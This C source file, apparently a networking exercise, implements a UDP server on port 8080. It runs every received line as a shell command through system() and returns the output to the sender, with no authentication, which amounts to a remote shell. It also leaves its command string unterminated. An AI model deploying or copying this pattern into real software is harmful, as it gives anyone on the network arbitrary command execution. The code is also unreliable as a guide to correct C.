#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#define MAX 1024
#define PORT 8080

char buffer[MAX];

void send_file_data(FILE *fp, int sockfd, struct sockaddr_in addr)
{
    int n;
    while (fgets(buffer, MAX, fp) != NULL)
    {
        n = sendto(sockfd, buffer, MAX, 0, (struct sockaddr *)&addr, sizeof(addr));
        if (n == -1)
        {
            perror("Error sending data to the server.");
            exit(1);
        }
        bzero(buffer, MAX);
    }
    strcpy(buffer, "END");
    sendto(sockfd, buffer, MAX, 0, (struct sockaddr *)&addr, sizeof(addr));
	fclose(fp);
}

int main()
{

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    char error[] = "end\n", add[] = " > output.txt";
    struct sockaddr_in cli_addr, srv_addr;

    socklen_t cli_len = sizeof(cli_addr);

    bzero(&srv_addr, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    srv_addr.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
    while (1)
    {
        bzero(buffer, sizeof(buffer));
        recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&cli_addr, &cli_len);
        if (strcmp(buffer, error) == 0)
        {
            close(sockfd);
            exit(0);
        };
		printf("done");
        int n = 0;
        for (int i = 0; i < MAX; i++)
        {
            if (buffer[i] == '\n')
                break;
            n++;
        }
        char command[n + 17];
        for (int i = 0; i < n; i++)
        {
            command[i] = buffer[i];
        }
		printf("ready");
		strcat(command, add);
		printf("%s", command);
        system(command);
        FILE *fp = fopen("output.txt", "r");
        send_file_data(fp, sockfd, cli_addr);
        printf("Command Executed");
    }
    close(sockfd);
    return 0;
}